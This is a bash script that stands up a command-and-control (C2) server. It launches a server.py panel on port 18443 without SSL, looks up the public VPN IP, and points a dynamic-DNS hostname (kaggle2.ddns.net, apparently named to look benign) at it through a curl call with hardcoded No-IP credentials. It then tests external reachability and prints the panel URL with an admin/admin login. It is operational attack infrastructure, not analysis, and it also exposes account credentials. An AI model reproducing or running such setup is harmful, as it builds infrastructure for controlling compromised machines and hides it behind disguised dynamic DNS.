#!/bin/bash
# Full C2 setup with VPN port forwarding

echo "=========================================="
echo "C2 SERVER SETUP - VPN PORT FORWARDING"
echo "=========================================="

cd /mnt/F/C2_server

# Kill old
pkill -9 -f "server.py" 2>/dev/null
sleep 1

# Start server
echo "[1] Starting C2 server on port 18443..."
python3 server.py --no-tunnel --no-ssl --port 18443 &
sleep 3

# Check server
echo "[2] Checking server..."
pgrep -f "server.py" > /dev/null && echo "    ✓ Server running" || echo "    ✗ Server failed"
ss -tlnp | grep -q 18443 && echo "    ✓ Port 18443 listening" || echo "    ✗ Port not listening"

# Get IP
echo "[3] Getting VPN IP..."
VPN_IP=$(curl -s -m 5 ifconfig.me 2>/dev/null || curl -s -m 5 icanhazip.com 2>/dev/null || curl -s -m 5 api.ipify.org 2>/dev/null)
echo "    VPN IP: $VPN_IP"

# Update No-IP
echo "[4] Updating No-IP..."
NOIP_RESULT=$(curl -s -m 10 -u "5ahzrgs:KztUHRKPuvVn" "https://dynupdate.no-ip.com/nic/update?hostname=kaggle2.ddns.net&myip=$VPN_IP" 2>/dev/null)
echo "    No-IP: $NOIP_RESULT"

# Check DNS
echo "[5] Checking DNS..."
DNS_IP=$(dig +short kaggle2.ddns.net @8.8.8.8 2>/dev/null | head -1)
echo "    DNS: kaggle2.ddns.net -> $DNS_IP"

# Test local
echo "[6] Testing local connection..."
if curl -s -m 3 http://127.0.0.1:18443/login > /dev/null 2>&1; then
    echo "    ✓ Local: OK"
else
    echo "    ✗ Local: FAIL"
fi

# Test external
echo "[7] Testing external connection..."
if curl -s -m 5 "http://${VPN_IP}:18443/login" > /dev/null 2>&1; then
    echo "    ✓ External: OK (port forwarding works!)"
else
    echo "    ✗ External: FAIL (check VPN port forwarding)"
fi

echo ""
echo "=========================================="
echo "RESULT"
echo "=========================================="
echo ""
echo "C2 Panel: http://kaggle2.ddns.net:18443"
echo "Login: admin / admin"
echo ""
echo "If external test FAILS:"
echo "  1. Check http://10.117.0.1 in browser"
echo "  2. Verify port 18443 is in the list"
echo "  3. Try different VPN server"
echo "=========================================="
